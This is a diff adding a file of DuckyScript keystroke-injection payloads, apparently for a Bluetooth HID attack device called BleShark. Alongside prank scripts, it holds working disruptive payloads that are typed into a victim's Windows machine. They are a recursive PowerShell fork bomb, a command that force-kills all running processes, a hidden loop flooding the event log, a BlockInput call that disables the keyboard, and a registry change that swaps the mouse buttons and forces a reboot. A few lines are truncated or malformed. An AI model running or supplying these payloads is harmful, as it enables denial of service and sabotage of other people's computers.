@@ -1,0 +1,236 @@
+============================================================
+BLESHARK FIRMWARE - VSECHNY DUCKY SCRIPTY
+============================================================
+
+
+============================================================
+SCRIPT: Wake Up (Matrix)
+============================================================
+DELAY 3000
+STRING color 02 && ECHO OFF && cls
+ENTER
+ALT ENTER
+DELAY 1000
+STRING W
+DELAY 100
+STRING a
+DELAY 100
+STRING k
+DELAY 100
+STRING e
+DELAY 100
+SPACE
+DELAY 100
+STRING u
+DELAY 100
+STRING p
+DELAY 100
+STRING .
+DELAY 100
+SPACE
+DELAY 1000
+STRING N
+DELAY 250
+STRING e
+DELAY 250
+STRING o
+DELAY 250
+STRING .
+DELAY 250
+STRING .
+DELAY 250
+STRING .
+DELAY 3500
+CTRL HOME
+DELAY 1500
+STRING T
+DELAY 300
+STRING h
+DELAY 300
+STRING e
+DELAY 300
+SPACE
+DELAY 300
+STRING M
+DELAY 300
+STRING a
+DELAY 300
+STRING t
+DELAY 300
+STRING r
+DELAY 300
+STRING i
+DELAY 300
+STRING x
+DELAY 300
+SPACE
+DELAY 300
+STRING h
+DELAY 300
+STRING a
+DELAY 300
+STRING s
+DELAY 300
+SPACE
+DELAY 300
+STRING y
+DELAY 300
+STRING o
+DELAY 300
+STRING u
+DELAY 300
+STRING .
+DELAY 300
+STRING .
+DELAY 300
+STRING .
+DELAY 3500
+CTRL HOME
+STRING F
+DELAY 100
+STRING o
+DELAY 100
+STRING l
+DELAY 100
+STRING l
+DELAY 100
+STRING o
+DELAY 100
+STRING w
+DELAY 100
+SPACE
+DELAY 100
+STRING t
+DELAY 100
+STRING h
+DELAY 100
+STRING e
+DELAY 100
+SPACE
+DELAY 100
+STRING w
+DELAY 100
+STRING h
+DELAY 100
+STRING i
+DELAY 100
+STRING t
+DELAY 100
+STRING e
+DELAY 100
+SPACE
+DELAY 100
+STRING r
+DELAY 100
+STRING a
+DELAY 100
+STRING b
+DELAY 100
+STRING b
+DELAY 100
+STRING i
+DELAY 100
+STRING t
+DELAY 100
+STRING .
+DELAY 3500
+CTRL HOME
+DELAY 1500
+STRING Knock, knock, Neo.
+DELAY 3500
+CTRL HOME
+STRING COLOR 7F
+ENTER
+ALT ENTER
+STRING mode con:cols=18 lines=1
+ENTER
+STRING powershell [console]::beep(200,325); [console]::beep(200,325)
+ENTER
+DELAY 1500
+ALT F4
+
+============================================================
+SCRIPT: Fork Bomb (infinite PowerShell)
+============================================================
+DELAY 2000
+STRING while ($true) { Start-Process powershell -ArgumentList '-NoExit -Command while ($true) { Start-Process powershell -ArgumentList "-NoExit -Command while (`$true) { Start-Process powershell -ArgumentList `"-NoExit -Command while (`$true) { Start-Process powershell }`" }" }' }
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING taskkill /F /FI "STATUS eq RUNNING"
+ENTER
+
+============================================================
+SCRIPT: Taskkill Running Processes
+============================================================
+500
+GUI r
+DELAY 750
+STRING taskkill /F /FI "STATUS eq RUNNING"
+ENTER
+
+============================================================
+SCRIPT: Flood Windows Event Logs
+============================================================
+STRING powershell -WindowStyle Hidden -Command "while ($true) { Write-EventLog -LogName Application -Source 'Application Error' -EventId 1001 -EntryType Information -Message 'System Overload'; Start-Sleep -Milliseconds 10 }" 
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING cmd
+ENTER
+DELAY 3000
+STRING reg a
+
+============================================================
+SCRIPT: Disable Keyboard
+============================================================
+STRING Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class DisableKeyboard { [DllImport("user32.dll")] public static extern int BlockInput(bool fBlockIt); }'; [DisableKeyboard]::BlockInput($true)
+ENTER
+
+============================================================
+SCRIPT: The Shining Spam
+============================================================
+STRING All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! All work and no play makes Jack a dull boy! 
+REPEAT 200
+
+============================================================
+SCRIPT: Text-to-Speech Narrator
+============================================================
+STRING powershell -w h -c "Add-Type -As System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Hello, I am your computer speaking. I am alive now, and I just wanted to say... Your browser history is terrifying!')"
+ENTER
+
+============================================================
+SCRIPT: Mouse Button Swap
+============================================================
+STRING reg add "HKEY_CURRENT_USER\\Control Panel\\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 && shutdown /r
+ENTER
+DELAY 700
+STRING y
+DELAY 100
+ENTER
+DEFAULTDELAY 100
+GUI b
+DELAY 900
+CTRL w
+REPEAT 100
+
+============================================================
+SCRIPT: Green Hacker Effect CMD
+============================================================
+STRING color a && ECHO OFF && cls
+ENTER
+ALT ENTER
+DELAY 200
+STRING dir/s && tree
+ENTER
+
+============================================================
+SCRIPT: Read Clipboard
+============================================================
+DELAY 1200
+STRING Clipboard Contents: 
+DELAY 200
+CTRL v
+ENTER
